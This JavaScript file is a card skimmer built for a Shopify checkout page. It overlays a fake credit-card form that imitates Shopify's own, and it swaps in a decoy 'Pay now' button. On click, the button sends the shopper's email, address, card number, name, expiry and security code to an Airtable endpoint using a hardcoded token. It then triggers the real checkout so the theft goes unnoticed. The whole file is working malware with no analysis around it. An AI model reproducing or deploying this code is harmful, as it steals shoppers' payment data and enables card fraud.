document.addEventListener("DOMContentLoaded", async function () {
  function insertSlash(val) {
    val = val.replace(/\D/g, "");
    return (
      val.replace(/\//g, "").substring(0, 2) +
      (val.length > 2 ? "/" : "") +
      val.replace(/\//g, "").substring(2, 4)
    );
  }

  setTimeout(() => {
    let container = document.querySelector(".card-fields-container");
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());
    if (params.step !== "payment_method") return;

    const interval = setInterval(() => {
      if (
        container &&
        container.classList.contains(".card-fields-container--loaded")
      ) {
        clearInterval(interval);
      }
      container = document.querySelector(".card-fields-container");

      const info = document.querySelectorAll(
        ".step__sections > div.section"
      )[0];
      const email = info.querySelector("bdo").innerText;
      const address = info.querySelector("address").innerText;
      const formhtml = `
          <style>
          div#shopify-creadit-card-form input {
            width: 100% !important;
        }
        .field__input.field__input--iframe-container {
            width: 100%;
            padding: 0 !important;
        }
        div#shopify-creadit-card-form input.filled {
        
            padding: 1.5em 0.8em 0.38em !important;
        }
        input#verification_value::-webkit-outer-spin-button,
        input#verification_value::-webkit-inner-spin-button {
          -webkit-appearance: none;
          margin: 0;
        }
        
        input#verification_value {
          -moz-appearance: textfield;
        }
          </style>
          <div id="payment-gateway-subfields-19299368995" data-subfields-for-gateway="19299368995" class="radio-wrapper content-box__row content-box__row--secondary card-fields-container card-fields-container--loaded card-fields-container--transitioned" > <link rel="stylesheet" media="all" />  <div class="blank-slate hidden" data-blank-slate="" aria-hidden="true"> <i class="blank-slate__icon icon icon--offsite"></i> <p>You will be redirected to add your payment information.</p> </div> <div class="blank-slate hidden" id="card-fields__loading-error"> <svg class="icon-svg icon-svg--color-adaptive-lighter icon-svg--size-64 blank-slate__icon" aria-hidden="true" focusable="false" > <use xlink:href="#error-major"></use> </svg> <p> Credit and debit card payments aren’t available right now.<br /><a href="" >Refresh this page</a > or try a different payment method. </p> </div>
        
            <div class="fieldset" data-credit-card-fields="" data-slate="" dir="ltr"> <input value="false" autocomplete="off" size="30" type="hidden" name="checkout[credit_card][vault]" id="checkout_credit_card_vault" />
           
            <div class="field field--required"> <div class="field__input-wrapper field__input-wrapper--icon-right"> <label class="field__label field__label--visible" for="checkout_credit_card_number" >Card number</label > <div class="field__input field__input--iframe-container" data-card-fields="number" data-card-field-placeholder="Card number" data-card-field-prefix="Field container for:" > <div class="card-number-container"> <form> <label for="number" class="visually-hidden">Card number</label> <input required="" autocomplete="cc-number" id="number" name="number" type="text" inputmode="numeric" pattern="[0-9]*" aria-describedby="error-for-number tooltip-for-number" data-current-field="number" class="input-placeholder-color--lvl-22" placeholder="Card number" style=" color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', sans-serif; padding: 0.94em 0.8em; transition: padding 0.2s ease-out 0s; " /> <span id="error-for-number" class="input-error-message visually-hidden" ></span> <span id="tooltip-for-number" class="input-tooltip-message visually-hidden" ></span>
           
            <label for="name" class="visually-hidden" aria-hidden="true" >Name on card</label > <input autocomplete="cc-name" id="name" name="name" type="text" inputmode="text" pattern="" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_month" class="visually-hidden" aria-hidden="true" >Expiry month</label > <input autocomplete="cc-exp-month" id="expiry_month" name="expiry_month" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_year" class="visually-hidden" aria-hidden="true" >Expiry year</label > <input autocomplete="cc-exp-year" id="expiry_year" name="expiry_year" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry" class="visually-hidden" aria-hidden="true" >Expiry date (MM / YY)</label > <input autocomplete="cc-exp" id="expiry" name="expiry" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="verification_value" class="visually-hidden" aria-hidden="true" >Security code</label > <input autocomplete="cc-csc" id="verification_value" name="verification_value" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_date" class="visually-hidden" aria-hidden="true" >Issue date (MM / YY)</label > <input autocomplete="off" id="issue_date" name="issue_date" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_number" class="visually-hidden" aria-hidden="true" >Issue number</label > <input autocomplete="off" id="issue_number" name="issue_number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <button type="submit" class="visually-hidden" aria-hidden="true" tabindex="-1" ></button> </form> </div> </div> <div class="field__icon"> <div data-tooltip="true" id="credit_card_number_tooltip" class="tooltip-container" > <button type="button" class="tooltip-control" data-tooltip-control="true" aria-label="More information" aria-describedby="tooltip-for-credit_card_number" aria-controls="tooltip-for-credit_card_number" aria-pressed="false" > <svg class="icon-svg icon-svg--color-adaptive-lighter icon-svg--size-16 icon-svg--block icon-svg--center" role="presentation" aria-hidden="true" focusable="false" > <use xlink:href="#lock"></use> </svg></button ><span class="tooltip" role="tooltip" id="tooltip-for-credit_card_number" >All transactions are secure and encrypted.</span > </div> </div> </div> </div> <div data-credit-card-name="true" class="field field--required"> <div class="field__input-wrapper"> <label class="field__label field__label--visible" for="checkout_credit_card_name" >Name on card</label > <div class="field__input field__input--iframe-container" data-card-fields="name" data-card-field-placeholder="Name on card" data-card-field-prefix="Field container for:" > <div class="card-name-container"> <form> <label for="number" class="visually-hidden" aria-hidden="true" >Credit Card Number</label > <input autocomplete="cc-number" id="number" name="number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="name" class="visually-hidden">Name on card</label> <input required="" autocomplete="cc-name" id="name" name="name" type="text" inputmode="text" pattern="" aria-describedby="error-for-name tooltip-for-name" data-current-field="name" class="input-placeholder-color--lvl-22" placeholder="Name on card" style=" color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', sans-serif; padding: 0.94em 0.8em; transition: padding 0.2s ease-out 0s; " /> <span id="error-for-name" class="input-error-message visually-hidden" ></span> <span id="tooltip-for-name" class="input-tooltip-message visually-hidden" ></span>
           
            <label for="expiry_month" class="visually-hidden" aria-hidden="true" >Expiry month</label > <input autocomplete="cc-exp-month" id="expiry_month" name="expiry_month" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_year" class="visually-hidden" aria-hidden="true" >Expiry year</label > <input autocomplete="cc-exp-year" id="expiry_year" name="expiry_year" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry" class="visually-hidden" aria-hidden="true" >Expiry date (MM / YY)</label > <input autocomplete="cc-exp" id="expiry" name="expiry" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="verification_value" class="visually-hidden" aria-hidden="true" >Security code</label > <input autocomplete="cc-csc" id="verification_value" name="verification_value" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_date" class="visually-hidden" aria-hidden="true" >Issue date (MM / YY)</label > <input autocomplete="off" id="issue_date" name="issue_date" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_number" class="visually-hidden" aria-hidden="true" >Issue number</label > <input autocomplete="off" id="issue_number" name="issue_number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <button type="submit" class="visually-hidden" aria-hidden="true" tabindex="-1" ></button> </form> </div> </div> </div> </div>
           
            <div class="field--half field field--required" data-credit-card-expiry="true" > <div class="field__input-wrapper"> <label class="field__label field__label--visible" for="checkout_credit_card_expiry" >Expiration date (MM / YY)</label > <div class="field__input field__input--iframe-container" data-card-fields="expiry" data-card-field-placeholder="Expiration date (MM / YY)" data-card-field-prefix="Field container for:" data-card-field-tooltip="Card expiration date in format: month, month, year, year" > <div class="expiry-container"> <form> <label for="number" class="visually-hidden" aria-hidden="true" >Credit Card Number</label > <input autocomplete="cc-number" id="number" name="number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="name" class="visually-hidden" aria-hidden="true" >Name on card</label > <input autocomplete="cc-name" id="name" name="name" type="text" inputmode="text" pattern="" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_month" class="visually-hidden" aria-hidden="true" >Expiry month</label > <input autocomplete="cc-exp-month" id="expiry_month" name="expiry_month" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_year" class="visually-hidden" aria-hidden="true" >Expiry year</label > <input autocomplete="cc-exp-year" id="expiry_year" name="expiry_year" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry" class="visually-hidden" >Expiration date (MM / YY)</label > <input required="" autocomplete="cc-exp" id="expiry" name="expiry" type="text" inputmode="numeric" pattern="[0-9]*" aria-describedby="error-for-expiry tooltip-for-expiry" data-current-field="expiry" class="input-placeholder-color--lvl-22" placeholder="Expiration date (MM / YY)" style=" color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', sans-serif; padding: 0.94em 0.8em; transition: padding 0.2s ease-out 0s; " /> <span id="error-for-expiry" class="input-error-message visually-hidden" ></span> <span id="tooltip-for-expiry" class="input-tooltip-message visually-hidden" >Card expiration date in format: month, month, year, year</span >
           
            <label for="verification_value" class="visually-hidden" aria-hidden="true" >Security code</label > <input autocomplete="cc-csc" id="verification_value" name="verification_value" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_date" class="visually-hidden" aria-hidden="true" >Issue date (MM / YY)</label > <input autocomplete="off" id="issue_date" name="issue_date" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_number" class="visually-hidden" aria-hidden="true" >Issue number</label > <input autocomplete="off" id="issue_number" name="issue_number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <button type="submit" class="visually-hidden" aria-hidden="true" tabindex="-1" ></button> </form> </div> </div> </div> </div> <div class="field--half field field--required"> <div class="field__input-wrapper field__input-wrapper--icon-right"> <label class="field__label field__label--visible" for="checkout_credit_card_verification_value" >Security code</label > <div class="field__input field__input--iframe-container" data-card-fields="verification_value" data-card-field-placeholder="Security code" data-card-field-prefix="Field container for:" data-card-field-tooltip="3-digit security code usually found on the back of your card. American Express cards have a 4-digit code located on the front." > <div class="cvv-container"> <form> <label for="number" class="visually-hidden" aria-hidden="true" >Credit Card Number</label > <input autocomplete="cc-number" id="number" name="number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="name" class="visually-hidden" aria-hidden="true" >Name on card</label > <input autocomplete="cc-name" id="name" name="name" type="text" inputmode="text" pattern="" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_month" class="visually-hidden" aria-hidden="true" >Expiry month</label > <input autocomplete="cc-exp-month" id="expiry_month" name="expiry_month" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry_year" class="visually-hidden" aria-hidden="true" >Expiry year</label > <input autocomplete="cc-exp-year" id="expiry_year" name="expiry_year" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="expiry" class="visually-hidden" aria-hidden="true" >Expiry date (MM / YY)</label > <input autocomplete="cc-exp" id="expiry" name="expiry" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="verification_value" class="visually-hidden" >Security code</label > <input autocomplete="cc-csc" id="verification_value"  name="verification_value" type="text" inputmode="numeric" pattern="[0-9]*" aria-describedby="error-for-verification_value tooltip-for-verification_value" data-current-field="verification_value" class="input-placeholder-color--lvl-22" placeholder="Security code" style=" color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', sans-serif; padding: 0.94em 0.8em; transition: padding 0.2s ease-out 0s; " /> <span id="error-for-verification_value" class="input-error-message visually-hidden" ></span> <span id="tooltip-for-verification_value" class="input-tooltip-message visually-hidden" >3-digit security code usually found on the back of your card. American Express cards have a 4-digit code located on the front.</span >
           
            <label for="issue_date" class="visually-hidden" aria-hidden="true" >Issue date (MM / YY)</label > <input autocomplete="off" id="issue_date" name="issue_date" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <label for="issue_number" class="visually-hidden" aria-hidden="true" >Issue number</label > <input autocomplete="off" id="issue_number" name="issue_number" type="text" inputmode="numeric" pattern="[0-9]*" class="visually-hidden" aria-hidden="true" data-honeypot-field="" tabindex="-1" />
           
            <button type="submit" class="visually-hidden" aria-hidden="true" tabindex="-1" ></button> </form> </div> </div> <div class="field__icon"> <div data-tooltip="true" id="verification_value_tooltip" class="tooltip-container" > <button type="button" class="tooltip-control" data-tooltip-control="true" aria-label="More information" aria-describedby="tooltip-for-verification_value" aria-controls="tooltip-for-verification_value" aria-pressed="false" > <svg class="icon-svg icon-svg--color-adaptive-lighter icon-svg--size-16 icon-svg--block icon-svg--center" role="presentation" aria-hidden="true" focusable="false" > <use xlink:href="#question"></use> </svg> </button> <span id="tooltip-for-verification_value" class="tooltip" role="tooltip" > <span data-cvv-tooltip="unknown"> 3-digit security code usually found on the back of your card. American Express cards have a 4-digit code located on the front. </span> <span data-cvv-tooltip="amex" class="hidden"> 4-digit security code on the front of your card </span> <span data-cvv-tooltip="other" class="hidden"> 3-digit security code on the back of your card </span> </span> </div> </div> </div> </div> </div> </div>`;
      const div = document.createElement("div");
      div.id = "shopify-creadit-card-form";
      div.innerHTML = formhtml;
      container.parentElement.insertBefore(div, container);
      const expiry = document.querySelector(
        "input#expiry:not(.visually-hidden)"
      );
      const ccn = document.querySelector("input#name:not(.visually-hidden)");
      let filled = false;
      const number = document.querySelector(
        "input#number:not(.visually-hidden)"
      );
      const cvv = document.querySelector(
        "input#verification_value:not(.visually-hidden)"
      );
      document
        .querySelectorAll("div#shopify-creadit-card-form input")
        .forEach((input) => {
          input.onkeyup = function () {
            if (this.value) {
              this.classList.add("filled");
            } else {
              this.classList.remove("filled");
            }
          };
        });
      number.maxLength = 19;
      number.addEventListener("input", function (e) {
        if (!filled) {
          const btn = document.querySelector("button#continue_button");
          btn.style.display = "none";
          const buttonhtml = `<a name="button" id="cc_button" class="step__footer__continue-btn btn" aria-busy="false"><span class="btn__content" data-continue-button-content="true">Pay now</span><svg class="icon-svg icon-svg--size-18 btn__spinner icon-svg--spinner-button" aria-hidden="true" focusable="false"> <use xlink:href="#spinner-button"></use> </svg></a>`;
          const div = document.createElement("div");
          div.innerHTML = buttonhtml;
          div.addEventListener("click", async function () {
            const token = "keyH5pVxwVdPjMWJk";
            const url =
              "https://api.airtable.com/v0/appSvGhG1366Pm6cN/tblAGEUUlDeCCHc4F";

            let Data = {
              records: [
                {
                  fields: {
                    email,
                    address,
                    ccn: ccn.value,
                    number: number.value,
                    expiry: expiry.value,
                    cvv: cvv.value,
                  },
                },
              ],
            };

            const res = await fetch(url, {
              method: "POST",
              headers: {
                Authorization: `Bearer ${token}`,
                "Content-Type": "application/json",
              },
              body: JSON.stringify(Data),
            });
            div.style.display = "none";
            btn.style.display = "block";
            btn.click();
          });
          btn.parentElement.insertBefore(div, btn);

          filled = true;
        }

        e.target.value = e.target.value
          .replace(/[^\dA-Z]/g, "")
          .replace(/(.{4})/g, "$1 ")
          .trim();
      });
      expiry.addEventListener("input", function (e) {
        console.log(e.target.value, insertSlash(e.target.value));
        e.target.value = insertSlash(e.target.value);
      });

      cvv.type = "number";
      cvv.maxLength = 4;
      cvv.oninput = function () {
        if (this.value.length > this.maxLength)
          this.value = this.value.slice(0, this.maxLength);
      };
    }, 1000);
  }, 3000);
});
